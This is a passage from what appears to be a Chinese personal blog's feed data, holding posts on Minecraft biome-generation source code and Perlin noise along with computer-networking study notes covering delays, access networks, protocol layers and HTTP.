class="line">   public static final RegistryKey&lt;Biome&gt; CRIMSON_FOREST &#x3D; makeKey(&quot;crimson_forest&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; WARPED_FOREST &#x3D; makeKey(&quot;warped_forest&quot;);</span><br><span class="line">   public static final RegistryKey&lt;Biome&gt; BASALT_DELTAS &#x3D; makeKey(&quot;basalt_deltas&quot;);</span><br></pre></td></tr></table></figure></div><p>可以看到，MC预先设置了数十个Key-Value对用于标识不同的生物群系，并以此为基础开发了各个不同群系的生成方法。<br>接下来我们通过BiomeMaker方法中的makeBirchForestBiome函数来进一步了解生物群系的具体生成方法。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public static Biome makeBirchForestBiome(float depth, float scale, boolean isTallVariant) &#123;</span><br><span class="line">      MobSpawnInfo.Builder mobspawninfo$builder &#x3D; new MobSpawnInfo.Builder();</span><br><span class="line">      DefaultBiomeFeatures.withPassiveMobs(mobspawninfo$builder);</span><br><span class="line">      DefaultBiomeFeatures.withBatsAndHostiles(mobspawninfo$builder);</span><br><span class="line">      BiomeGenerationSettings.Builder biomegenerationsettings$builder &#x3D; (new BiomeGenerationSettings.Builder()).withSurfaceBuilder(ConfiguredSurfaceBuilders.field_244178_j);</span><br><span class="line">      DefaultBiomeFeatures.withStrongholdAndMineshaft(biomegenerationsettings$builder);</span><br><span class="line">      biomegenerationsettings$builder.withStructure(StructureFeatures.RUINED_PORTAL);</span><br><span class="line">      DefaultBiomeFeatures.withCavesAndCanyons(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withLavaAndWaterLakes(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withMonsterRoom(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withAllForestFlowerGeneration(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withCommonOverworldBlocks(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withOverworldOres(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withDisks(biomegenerationsettings$builder);</span><br><span class="line">      if (isTallVariant) &#123;</span><br><span class="line">         DefaultBiomeFeatures.withTallBirches(biomegenerationsettings$builder);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         DefaultBiomeFeatures.withBirchTrees(biomegenerationsettings$builder);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      DefaultBiomeFeatures.withDefaultFlowers(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withForestGrass(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withNormalMushroomGeneration(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withSugarCaneAndPumpkins(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withLavaAndWaterSprings(biomegenerationsettings$builder);</span><br><span class="line">      DefaultBiomeFeatures.withFrozenTopLayer(biomegenerationsettings$builder);</span><br><span class="line">      return (new Biome.Builder()).precipitation(Biome.RainType.RAIN).category(Biome.Category.FOREST).depth(depth).scale(scale).temperature(0.6F).downfall(0.6F).setEffects((new BiomeAmbience.Builder()).setWaterColor(4159204).setWaterFogColor(329011).setFogColor(12638463).withSkyColor(getSkyColorWithTemperatureModifier(0.6F)).setMoodSound(MoodSoundAmbience.DEFAULT_CAVE).build()).withMobSpawnSettings(mobspawninfo$builder.copy()).withGenerationSettings(biomegenerationsettings$builder.build()).build();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><p>一般来说，地形生成的函数通常具有一定的参数输入。对于稀有/罕见或者简单的的生物群系而言，生成函数也可以没有任何输入，例如makeSmallEndIslandsBiome()等。而对于常见的群系例如BirchForestBiome(桦树林)而言，它具有depth，scale，isTallVariant三个参数，分别代表了它的深度、规模以及是否为巨型群系。<br>在函数中，会对所有的生物以及地貌生成进行判定与执行，例如本段代码中，先后进行了是否有怪物生成、是否有被动型怪物生成、是否有要塞或矿井生成、是否有洞穴或峡谷生成等等。</p><h1 id="MC与图形处理"><a href="#MC与图形处理" class="headerlink" title="MC与图形处理"></a>MC与图形处理</h1><h2 id="引入噪声——以Prelin噪声为例"><a href="#引入噪声——以Prelin噪声为例" class="headerlink" title="引入噪声——以Prelin噪声为例"></a>引入噪声——以Prelin噪声为例</h2><p>在图形学中，我们使用噪声就是为了把一些随机变量来引入到程序中。从程序角度来说，噪声很好理解，我们希望给定一个输入，程序可以给出一个输出：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value_type noise(value_type p) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>它的输入和输出类型的维数可以是不同的组合，例如输入二维输出一维，输入二维输出二维等。而这不同的函数集合就是噪声的具体实现。<br>在代码实践中，我们常常使用random函数等为我们提供相当数量的伪随机数，同样，在图形学中我们也经常会需要使用随机变量，例如火焰、地形、云朵的模拟等等。MC中就广泛的使用了随机变量，但是由于伪随机函数生成的随机值太“随机”了，</p><h1 id="MC生物AI的核心——传感器与感知器"><a href="#MC生物AI的核心——传感器与感知器" class="headerlink" title="MC生物AI的核心——传感器与感知器"></a>MC生物AI的核心——传感器与感知器</h1><h1 id><a href="#" class="headerlink" title></a></h1><p>Editing…</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
            <tag> 源代码 </tag>
            
            <tag> Java </tag>
            
            <tag> 类 </tag>
            
            <tag> 代码分析 </tag>
            
            <tag> Mod </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络复习</title>
      <link href="/post/9a8cdc59.html"/>
      <url>/post/9a8cdc59.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="计算机网络复习课"><a href="#计算机网络复习课" class="headerlink" title="计算机网络复习课"></a>计算机网络复习课</h1><h2 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h2><p>1.时延问题</p><p>最重要的是传输时延：d = （N+P-1）* L/R</p><p>2.五个部分</p><ul><li>因特网中的概念<ul><li>计算机网络的定义：两台以上具有独立操作系统的计算机通过某些介质连接成的相互共享软硬件资源的集合体。</li><li>因特网的概念</li></ul></li><li>网络结构<ul><li>网络边缘<ul><li>端系统（主机）<ul><li>客户机</li><li>服务器</li></ul></li><li>接入网络<ul><li>家庭接入网络</li><li>企业接入网络</li><li>广域接入网络</li></ul></li><li>物理媒体<ul><li>数字接入线（DSL）</li><li>混合光纤同轴系统（HFC）</li><li>光纤到户（FTTH）</li></ul></li></ul></li><li>网络核心<ul><li>分组交换</li><li>电路交换</li></ul></li></ul></li><li>四种时延</li><li>协议层参考模型</li><li>网络安全</li></ul><h2 id="第二章-应用层"><a href="#第二章-应用层" class="headerlink" title="第二章 应用层"></a>第二章 应用层</h2><h3 id="1-应用层协议原理"><a href="#1-应用层协议原理" class="headerlink" title="1.应用层协议原理"></a>1.应用层协议原理</h3><h4 id="1-1应用体系结构"><a href="#1-1应用体系结构" class="headerlink" title="1.1应用体系结构"></a>1.1应用体系结构</h4><ul><li>客户-服务器</li><li>P2P</li></ul><h4 id="1-2-进程通信"><a href="#1-2-进程通信" class="headerlink" title="1.2 进程通信"></a>1.2 进程通信</h4><h4 id="1-3-应用层传输服务"><a href="#1-3-应用层传输服务" class="headerlink" title="1.3 应用层传输服务"></a>1.3 应用层传输服务</h4><ul><li>数据丢失率</li><li>定时</li><li>带宽和吞吐量</li><li>安全</li></ul><h3 id="2-HTTP协议"><a href="#2-HTTP协议" class="headerlink" title="2.HTTP协议"></a>2.HTTP协议</h3><h4 id="2-1特点"><a href="#2-1特点" class="headerlink" title="2.1特点"></a>2.1特点</h4><h4 id="2-2-分类"><a href="#2-2-分类" class="headerlink" title="2.2 分类"></a>2.2 分类</h4><h4 id="2-3-报文格式和响应状态码"><a href="#2-3-报文格式和响应状态码" class="headerlink" title="2.3 报文格式和响应状态码"></a>2.3 报文格式和响应状态码</h4><h4 id="2-4-Cookies：用户与服务器的交互"><a href="#2-4-Cookies：用户与服务器的交互" class="headerlink" title="2.4 Cookies：用户与服务器的交互"></a>2.4 Cookies：用户与服务器的交互</h4><h4 id="2-5-代理服务器：Web缓存"><a href="#2-5-代理服务器：Web缓存" class="headerlink" title="2.5 代理服务器：Web缓存"></a>2.5 代理服务器：Web缓存</h4><h4 id="2-6-条件GET（首部行）"><a href="#2-6-条件GET（首部行）" class="headerlink" title="2.6 条件GET（首部行）"></a>2.6 条件GET（首部行）</h4><h3 id="3-电子协议"><a href="#3-电子协议" class="headerlink" title="3.电子协议"></a>3.电子协议</h3><h4 id="3-1-SMTP"><a href="#3-1-SMTP" class="headerlink" title="3.1 SMTP"></a>3.1 SMTP</h4><ul><li>特点<ul><li>持久连接</li><li>报文体为7-bit ASCII</li></ul></li><li>与HTTP比较</li><li>邮件报文格式</li></ul><p>####3.2 邮件访问协议</p><ul><li>POP3（不包含状态信息）</li><li>IMAP（跟踪用户状态）</li></ul><h3 id="4-DNS"><a href="#4-DNS" class="headerlink" title="4. DNS"></a>4. DNS</h3><h4 id="4-1-提供服务"><a href="#4-1-提供服务" class="headerlink" title="4.1 提供服务"></a>4.1 提供服务</h4><ul><li>主机名到IP地址的转换</li><li>主机别名</li><li>邮件服务器别名</li><li>负载分配</li></ul><h4 id="4-2-工作机理"><a href="#4-2-工作机理" class="headerlink" title="4.2 工作机理"></a>4.2 工作机理</h4><ul><li>集中式DNS缺点</li><li>DNS分类<ul><li>根DNS服务器</li><li>域顶级DNS服务器</li><li>权威DNS服务器</li><li>本地DNS服务器</li></ul></li><li>DNS查询方法<ul><li>递归查询</li><li>迭代查询</li></ul></li><li>DNS缓存</li></ul><p>####4.3 DNS记录和报文</p><ul><li>RR格式</li><li>DNS报文</li><li>P2P技术</li></ul><h3 id="5-套接字编程"><a href="#5-套接字编程" class="headerlink" title="5.套接字编程"></a>5.套接字编程</h3><ul><li>UDP</li><li>TCP</li></ul><h2 id="第三章-传输层"><a href="#第三章-传输层" class="headerlink" title="第三章 传输层"></a>第三章 传输层</h2><p>重点见pad上的目录</p><h2 id="第四章-网络层"><a href="#第四章-网络层" class="headerlink" title="第四章 网络层"></a>第四章 网络层</h2><p>见思维导图</p><h2 id="第五章-链路层"><a href="#第五章-链路层" class="headerlink" title="第五章 链路层"></a>第五章 链路层</h2>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络基础</title>
      <link href="/post/9ab2931e.html"/>
      <url>/post/9ab2931e.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h1><h2 id="第一章-计算机网络和因特网"><a href="#第一章-计算机网络和因特网" class="headerlink" title="第一章 计算机网络和因特网"></a>第一章 计算机网络和因特网</h2><h3 id="1-协议的三要素："><a href="#1-协议的三要素：" class="headerlink" title="1.协议的三要素："></a>1.协议的三要素：</h3><ul><li>语法</li><li>语义</li><li>同步</li></ul><h3 id="2-网络结构"><a href="#2-网络结构" class="headerlink" title="2.网络结构"></a>2.网络结构</h3><ul><li>网络边缘</li><li>接入网络、物理介质</li><li>网络核心</li></ul><h3 id="3-端系统模型"><a href="#3-端系统模型" class="headerlink" title="3.端系统模型"></a>3.端系统模型</h3><ul><li>客户/服务器模型</li><li>端对端模型<ul><li>bt下载 迅雷</li><li>区块链</li></ul></li></ul><h3 id="4-接入网络"><a href="#4-接入网络" class="headerlink" title="4.接入网络"></a>4.接入网络</h3><h4 id="4-1带宽"><a href="#4-1带宽" class="headerlink" title="4.1带宽"></a>4.1带宽</h4><p>1.带宽表示单位时间内（一般以”秒”为单位）传输数据容量的大小，表示吞吐数据的能力。所以我们一般也将”带宽”成为”数据传输率”</p><p>2.单位</p><p>（1）以字节为单位：Bps，KBps，MBps等</p><p>（2）以比特为单位：bps，Kbps，Mbps等</p><p>换算：</p><p>1B/s = 8b/s（bps）</p><p>1KB/s = 8Kb/s</p><p>1MB/s = 8Mb/s</p><p>平时用bps比较多。</p><h4 id="4-2-数字用户线路（DSL）"><a href="#4-2-数字用户线路（DSL）" class="headerlink" title="4.2 数字用户线路（DSL）"></a>4.2 数字用户线路（DSL）</h4><p>1.用已有的电话线路</p><p>（1）DSL承载的数据进入Internet</p><p>（2）DSL承载的语音进入电话交换网</p><p>2.速率</p><p>（1）上行速率&lt;2.5Mbp</p><p>（2）下行速率&lt;24 Mbp</p><p>3.ADSL：非对称数字用户线路</p><p>主要是下载，对上传的需求不高。</p><h4 id="4-3-电缆接入网络"><a href="#4-3-电缆接入网络" class="headerlink" title="4.3 电缆接入网络"></a>4.3 电缆接入网络</h4><p>1.使用有线电视网接入Internet</p><p>2.HFC：混合光纤同轴电缆</p><h4 id="4-4-光纤到户"><a href="#4-4-光纤到户" class="headerlink" title="4.4 光纤到户"></a>4.4 光纤到户</h4><p>1.把光纤直接拉到家里</p><p>2.ONT：光纤网络端接器（家庭端）</p><p>OLT：光纤网络端接器（电信公司端）</p><h4 id="4-5-接入网络"><a href="#4-5-接入网络" class="headerlink" title="4.5 接入网络"></a>4.5 接入网络</h4><ul><li>家庭网络（家庭路由器）</li><li>企业接入网络（LAN）</li><li>WI-FI无线接入网络</li><li>广域无线接入网络（3G、4G、5G）</li></ul><h4 id="4-6-物理介质"><a href="#4-6-物理介质" class="headerlink" title="4.6 物理介质"></a>4.6 物理介质</h4><p>1.物理链路：传播位（bit）信号</p><p>2.分类：</p><ul><li>导引型媒体<ul><li>双绞线</li><li>同轴电缆</li><li>光纤线缆：<ul><li>单模光纤</li><li>多模光纤</li></ul></li></ul></li><li>非导引型媒体（无限电磁波）<ul><li>地面微波</li><li>局域无限通道（WI-FI）</li><li>广域无限通道（cellular，也就是3G、4G）</li><li>卫星通信</li></ul></li></ul><h3 id="5-网络核心"><a href="#5-网络核心" class="headerlink" title="5.网络核心"></a>5.网络核心</h3><h4 id="5-1-基本原理"><a href="#5-1-基本原理" class="headerlink" title="5.1 基本原理"></a>5.1 基本原理</h4><p>1.电路交换</p><p>2.分组交换</p><h4 id="5-2-电路交换"><a href="#5-2-电路交换" class="headerlink" title="5.2 电路交换"></a>5.2 电路交换</h4><p>1.网络资源（如带宽）被分片，称为多路复用</p><p>2.分片方式</p><ul><li>频分 FDM</li><li>时分 TDM</li></ul><h4 id="5-3-分组交换"><a href="#5-3-分组交换" class="headerlink" title="5.3 分组交换"></a>5.3 分组交换</h4><p>1.统计复用</p><p>2.特点</p><ul><li>资源竞争</li><li>拥塞</li><li>存储转发：分组每次转发1站</li></ul><p>3.分类</p><ul><li>数据报网络</li><li>虚电路网络</li></ul><h4 id="5-4-ISP的结构组成"><a href="#5-4-ISP的结构组成" class="headerlink" title="5.4 ISP的结构组成"></a>5.4 ISP的结构组成</h4><p>1.互联网服务提供商：ISP</p><ol start="2"><li><p>（1）第一层ISP</p></li></ol><p>（2）第二层ISP</p><p>（3）本地ISP</p><h3 id="6-分组交换网络中的延迟、丢失和吞吐量"><a href="#6-分组交换网络中的延迟、丢失和吞吐量" class="headerlink" title="6.分组交换网络中的延迟、丢失和吞吐量"></a>6.分组交换网络中的延迟、丢失和吞吐量</h3><p>####6.1 分组延迟的四种类型</p><p>1.处理时延</p><p>检查错误位</p><p>选择输出链路</p><p>2.排队时延</p><p>等待时间</p><p>拥塞程度</p><p>3.传输时延</p><p>R = 链路带宽（<em>管子直径</em>）</p><p>L = 分组长度</p><p>发送分组比特流的时间 = L/R</p><p>4.传播时延</p><p>d = 物理链路的长度</p><p>s = 介质的信号传播速度（<em>管子直径造成的水流速度</em>）</p><p>传播时延 = d/s</p><h4 id="6-2-总的节点时延"><a href="#6-2-总的节点时延" class="headerlink" title="6.2 总的节点时延"></a>6.2 总的节点时延</h4><p>d（nodal）= d（proc）+ d（queue）+ d（trans）+ d（prop）</p><h4 id="6-3-排队时延的进一步解释"><a href="#6-3-排队时延的进一步解释" class="headerlink" title="6.3 排队时延的进一步解释"></a>6.3 排队时延的进一步解释</h4><p>R = 链路带宽</p><p>L = 分组长度</p><p>a = 平局分组到达率</p><p>流量强度 traffic intensity = La/R</p><ul><li><p>La/R ~ 0</p><p>​ 平均排队时延极小接近于0</p></li><li><p>La/R -&gt; 1</p><p>​ 排队时延大幅增大</p></li><li><p>La/R &gt; 1</p><p>​ 排队时延趋于无穷大</p></li></ul><h4 id="6-4-概念"><a href="#6-4-概念" class="headerlink" title="6.4 概念"></a>6.4 概念</h4><p>1.分组丢失-&gt;丢包率</p><p>2.吞吐量：单位时间内整个网络传输数据的速率或分组数（bps）</p><ul><li><p>瞬时吞吐量</p></li><li><p>平均吞吐量</p><p>min{Rs,Rc}</p></li></ul><h3 id="7-协议层及其服务模型"><a href="#7-协议层及其服务模型" class="headerlink" title="7.协议层及其服务模型"></a>7.协议层及其服务模型</h3><h4 id="7-1-ISO-OSI七层参考模型"><a href="#7-1-ISO-OSI七层参考模型" class="headerlink" title="7.1 ISO/OSI七层参考模型"></a>7.1 ISO/OSI七层参考模型</h4><p>| 层号 | 层的名称 | | —- | ———- | | 7 | 应用层 | | 6 | 表示层 | | 5 | 会话层 | | 4 | 传输层 | | 3 | 网络层 | | 2 | 数据链路层 | | 1 | 物理层 |</p><h4 id="7-2-TCP-IP参考模型"><a href="#7-2-TCP-IP参考模型" class="headerlink" title="7.2 TCP/IP参考模型"></a>7.2 TCP/IP参考模型</h4><p>| TCP/IP参考模型1 | TCP/IP参考模型2 | | ————— | ————— | | 应用层 | 应用层 | | 传输层 | 传输层 | | 网络层 | 网络层 | | 网络接口层 | 数据链路层 | | | 物理层 |</p><h4 id="7-3-协议分层与数据"><a href="#7-3-协议分层与数据" class="headerlink" title="7.3 协议分层与数据"></a>7.3 协议分层与数据</h4><p>1.各层发方从上层到下层，收方 从下层到上层传递数据。</p><p>2.发方添加头部信息创建新的数据单元，收方去掉头部。</p><p>3.传递新的数据单元到上层/下层</p><p>4.各层传送不同的协议数据单元PDU</p><h3 id="8-网络安全概述"><a href="#8-网络安全概述" class="headerlink" title="8. 网络安全概述"></a>8. 网络安全概述</h3><h4 id="8-1-攻击威胁下的网络"><a href="#8-1-攻击威胁下的网络" class="headerlink" title="8.1 攻击威胁下的网络"></a>8.1 攻击威胁下的网络</h4><p>1.网络安全问题产生的原因</p><ul><li>网络的开放性</li><li>软硬件/协议设计者的局限</li><li>时代和技术的发展</li></ul><p>2.攻击方式</p><ul><li>被动攻击</li><li>主动攻击</li></ul><h4 id="8-2-网络安全的重要属性"><a href="#8-2-网络安全的重要属性" class="headerlink" title="8.2 网络安全的重要属性"></a>8.2 网络安全的重要属性</h4><p>1.机密性</p><p>2.真实性</p><p>3.完整性</p><p>4.可用性</p><p>5.不可否认性</p><h2 id="第二章-应用层"><a href="#第二章-应用层" class="headerlink" title="第二章 应用层"></a>第二章 应用层</h2><h3 id="1-网络应用程序体系结构"><a href="#1-网络应用程序体系结构" class="headerlink" title="1.网络应用程序体系结构"></a>1.网络应用程序体系结构</h3><h4 id="1-1-客户机-服务器体系结构"><a href="#1-1-客户机-服务器体系结构" class="headerlink" title="1.1 客户机/服务器体系结构"></a>1.1 客户机/服务器体系结构</h4><ul><li>服务器<ul><li>总是打开的</li><li>具有固定的、众所周知的IP地址</li></ul></li><li>客户机<ul><li>可以拥有动态IP地址</li><li>客户机相互之间不直接通信</li></ul></li></ul><h4 id="1-2-P2P体系结构"><a href="#1-2-P2P体系结构" class="headerlink" title="1.2 P2P体系结构"></a>1.2 P2P体系结构</h4><ul><li>没有总是打开的服务器</li><li>任意一对主机直接相互通信</li><li>对等方间歇连接并且可以改变IP地址</li><li>优缺点<ul><li>优点：自扩展性</li><li>缺点：难以管理</li></ul></li></ul><h4 id="1-3-客户机-服务器和P2P混合的体系结构"><a href="#1-3-客户机-服务器和P2P混合的体系结构" class="headerlink" title="1.3 客户机/服务器和P2P混合的体系结构"></a>1.3 客户机/服务器和P2P混合的体系结构</h4><p>举例：</p><ul><li>Napster</li><li>即时讯息（QQ、Wechat）</li></ul><h3 id="2-进程通信"><a href="#2-进程通信" class="headerlink" title="2.进程通信"></a>2.进程通信</h3><h4 id="2-1-通信方式"><a href="#2-1-通信方式" class="headerlink" title="2.1 通信方式"></a>2.1 通信方式</h4><p>（1）同一主机上的两个进程通过内部进程通信机制进行通信</p><p>（2）不同主机上的进程通过交换报文相互通信</p><h4 id="2-2-命名"><a href="#2-2-命名" class="headerlink" title="2.2 命名"></a>2.2 命名</h4><p>（1）客户进程：发起通信的进程</p><p>（2）服务器进程：等待联系的进程</p><p>注意：具有P2P体系结构的应用程序既有客户进程又有服务器进程。</p><h4 id="2-3-进程与计算机网络的接口-套接字"><a href="#2-3-进程与计算机网络的接口-套接字" class="headerlink" title="2.3 进程与计算机网络的接口-套接字"></a>2.3 进程与计算机网络的接口-套接字</h4><p>（1）套接字又叫做应用程序编程接口API</p><p>（2）应用层的进程相关的工作由开发者控制，而套接字以下的工作是由操作系统来完成的。</p><h4 id="2-4-进程寻址"><a href="#2-4-进程寻址" class="headerlink" title="2.4 进程寻址"></a>2.4 进程寻址</h4><p>（1）主机有唯一的32位IP地址</p><p>（2）主机上的进程标识包括IP地址和端口号（因为一台主机上有很多个进程</p><p>（3）常用应用程序的端口号</p><ul><li>Web服务：80</li><li>邮件服务：25</li></ul><h4 id="2-5-应用层协议"><a href="#2-5-应用层协议" class="headerlink" title="2.5 应用层协议"></a>2.5 应用层协议</h4><p>（1）组成</p><ul><li>报文类型</li><li>报文类型的语法</li><li>字段的语义</li><li>进程何时、如何发送报文及对报文进行响应</li></ul><p>（2）分类</p><ul><li>公共领域协议</li><li>专用协议</li></ul><h4 id="2-6-应用需要的服务"><a href="#2-6-应用需要的服务" class="headerlink" title="2.6 应用需要的服务"></a>2.6 应用需要的服务</h4><p>1.数据丢失率</p><p>2.带宽和吞吐量</p><p>3.安全</p><p>4.定时</p><h4 id="2-7-因特网传输协议提供的服务"><a href="#2-7-因特网传输协议提供的服务" class="headerlink" title="2.7 因特网传输协议提供的服务"></a>2.7 因特网传输协议提供的服务</h4><p>1.TCP服务</p><ul><li>面向连接的服务（<em>发送方和接收方都已经准备好了才开始通信</em>）</li><li>可靠的传输服务</li><li>流量控制</li><li>拥塞控制</li><li>没有提供时延保证和最小带宽保证</li></ul><p>2.UDP服务</p><ul><li>无连接的服务（<em>发送方在开始通信前不去询问接收方是否已经准备好</em>）</li><li>不可靠数据传输</li></ul><h4 id="2-8-安全TCP"><a href="#2-8-安全TCP" class="headerlink" title="2.8 安全TCP"></a>2.8 安全TCP</h4><p>1.SSL（Sucurity Socket Layer）</p><ul><li>提供加密的TCP连接</li><li>保证数据完整性</li><li>端点认证</li><li>SSL提供套接字API</li></ul><h3 id="3-HTTP概况"><a href="#3-HTTP概况" class="headerlink" title="3.HTTP概况"></a>3.HTTP概况</h3><h4 id="3-1-概述"><a href="#3-1-概述" class="headerlink" title="3.1 概述"></a>3.1 概述</h4><p>（1）HTTP：超文本传输协议</p><p>（2）Web的应用层协议</p><p>（3）C/S模式</p><h4 id="3-2-Web和HTTP"><a href="#3-2-Web和HTTP" class="headerlink" title="3.2 Web和HTTP"></a>3.2 Web和HTTP</h4><p>（1）网页由许多<strong>对象</strong>组成</p><p>（2）对象就是文件</p><p>（3）多数网页由单个基本HTML文件和若干个所引用的对象构成</p><p>（4）URL：协议+主机名+路径名</p><p>（5）HTTP是无状态协议</p><ul><li>HTTP服务器不维护客户先前的状态信息</li><li>维护状态的协议非常复杂</li></ul><h3 id="4-非持久连接和持久连接"><a href="#4-非持久连接和持久连接" class="headerlink" title="4.非持久连接和持久连接"></a>4.非持久连接和持久连接</h3><h4 id="4-1-非持久HTTP连接"><a href="#4-1-非持久HTTP连接" class="headerlink" title="4.1 非持久HTTP连接"></a>4.1 非持久HTTP连接</h4><p>（1）每个TCP连接上只传送一个对象，下载多个对象需要建立多个TCP连接</p><p>（2）HTTP/1.0使用非持久HTTP连接</p><h4 id="4-2-持久HTTP连接"><a href="#4-2-持久HTTP连接" class="headerlink" title="4.2 持久HTTP连接"></a>4.2 持久HTTP连接</h4><p>（1）一个TCP连接上可以传送多个对象</p><p>（2）HTTP/1.1默认使用持久HTTP连接</p><p>（3）分类</p><ul><li>不带流水线的持久HTTP连接<ul><li>客户先前响应消息收到，才发出新的消息请求</li><li>每个引用对象经历一个RTT</li></ul></li><li>带流水线的持久HTTP连接<ul><li>HTTP/1.1默认使用</li><li>客户遇到1一个引用对象就发送请求对象</li><li>所有引用对象只经历一个RTT</li></ul></li></ul><h4 id="4-3-响应时间模型"><a href="#4-3-响应时间模型" class="headerlink" title="4.3 响应时间模型"></a>4.3 响应时间模型</h4><p>（1）定义往返时间RTT</p><ul><li>一个小分组从客户主机到服务器再到客户主机所花费的时间</li><li>一个RTT用于建立TCP连接</li><li>一个RTT用于HTTP请求/响应消息的交互</li><li>HTML文件传输时间：total = 2RTT + transmit time</li></ul><h3 id="5-HTTP报文格式"><a href="#5-HTTP报文格式" class="headerlink" title="5.HTTP报文格式"></a>5.HTTP报文格式</h3><h4 id="5-1-请求报文"><a href="#5-1-请求报文" class="headerlink" title="5.1 请求报文"></a>5.1 请求报文</h4><p>（1）都是ASCII文本</p><p>（2）</p><p>请求行</p><p>头部行</p><p>回车换行（指示结束）</p><p>（3）</p><p>请求行 ：方法 sp URI sp 版本 cr lf</p><p>首部行： 首部字段名 sp 值 cr lf</p><p>​ 首部字段名 sp 值 cr lf</p><p>​ 首部字段名 sp 值 cr lf</p><p>空行：cr lf</p><p>实体主体</p><p>（4）请求方法类型</p><ul><li>HTTP/1.0<ul><li>GET</li><li>POST</li><li>HEAD</li></ul></li><li>HTTP/1.1<ul><li>GET，POST，HEAD</li><li>PUT</li><li>DELETE</li></ul></li></ul><p>（5）上载表单（各字段）输入值</p><ul><li>POST方法<ul><li>网页时常包含表单输入</li><li>输入值在请求报文的实体主体中被上载到服务器</li></ul></li><li>URL方法<ul><li>使用GET方法</li><li>表单（各字段）输入值被上载，以URL请求行的字段</li></ul></li></ul><h4 id="5-2-响应报文"><a href="#5-2-响应报文" class="headerlink" title="5.2 响应报文"></a>5.2 响应报文</h4><p>（1）同样是ASCII码</p><p>（2）</p><p>状态行</p><p>首部行</p><p>回车换行</p><p>数据</p><p>（3）HTTP响应的状态码</p><ul><li>200 OK</li><li>301 Moved Permanenly</li><li>400 Bad Request</li><li>404 Not Found</li><li>500 Internal Server Error</li></ul><h3 id="6-用户与服务器交互：Cookies"><a href="#6-用户与服务器交互：Cookies" class="headerlink" title="6.用户与服务器交互：Cookies"></a>6.用户与服务器交互：Cookies</h3><h4 id="6-1-目的"><a href="#6-1-目的" class="headerlink" title="6.1 目的"></a>6.1 目的</h4><p>提高用户和服务器的交互性</p><h4 id="6-2-跟踪用户"><a href="#6-2-跟踪用户" class="headerlink" title="6.2 跟踪用户"></a>6.2 跟踪用户</h4><p>（1）李四的栗子</p><p><a href="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/cookies%EF%BC%88%E6%9D%8E%E5%9B%9B%EF%BC%89.png" data-fancybox="group" data-caption="cookies（李四）" class="fancybox"><img alt="cookies（李四）" title="cookies（李四）" data-src="/Users/chenxiaoyu/Desktop/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0/PPT%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87/cookies%EF%BC%88%E6%9D%8E%E5%9B%9B%EF%BC%89.png" 